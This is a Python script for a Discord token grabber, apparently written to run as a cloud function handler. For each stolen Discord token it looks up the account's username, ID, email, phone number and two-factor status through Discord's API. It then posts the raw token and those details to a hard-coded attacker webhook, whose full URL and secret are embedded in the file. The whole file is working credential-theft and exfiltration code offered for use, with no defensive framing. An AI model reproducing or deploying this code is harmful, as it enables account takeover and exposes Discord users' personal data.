import requests

class DiscordTokenGrabber:
    def __init__(self, webhook):
        self.webhook = webhook
        self.base_url = "https://discord.com/api/v9/users/@me"

    def validate_token(self, token: str) -> bool:
        try:
            r = requests.get(self.base_url, headers={'Authorization': token})
            return r.status_code == 200
        except Exception as e:
            print(f"Validation error: {e}")
            return False

    def upload_tokens(self, tokens):
        if not tokens:
            print("No tokens found.")
            return

        for token in tokens:
            try:
                user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
                username = user['username'] + '#' + user['discriminator']
                user_id = user['id']
                email = user['email']
                phone = user['phone']
                mfa = user['mfa_enabled']
                avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"

                # Example image URL
                image_url = "https://m.media-amazon.com/images/I/61dx3faBVrL._SL1500_.jpg"
                embed = {
                    "title": f"{username} ({user_id})",
                    "color": 0x000000,
                    "thumbnail": {"url": avatar},
                    "image": {"url": image_url},  # Include the image URL here
                    "fields": [
                        {"name": "Token", "value": f"```{token}```", "inline": False},
                        {"name": "Email", "value": email if email else "None", "inline": True},
                        {"name": "Phone", "value": phone if phone else "None", "inline": True},
                        {"name": "MFA", "value": mfa, "inline": True}
                    ]
                }

                requests.post(self.webhook, json={"embeds": [embed]})
            except Exception as e:
                print(f"Upload error: {e}")

# Example usage
def handler(event, context):
    webhook_url = "https://discord.com/api/webhooks/1337860504567418932/2HQhqG9eH6UgmEHowYa6UbqP9-1Ld89uMzvQc1-qXmetOuxGOB4riXZMHyzumsapR-Si"
    tokens = event.get('tokens', [])

    grabber = DiscordTokenGrabber(webhook_url)
    grabber.upload_tokens(tokens)

    return {
        "statusCode": 200,
        "body": "Tokens uploaded successfully."
    }
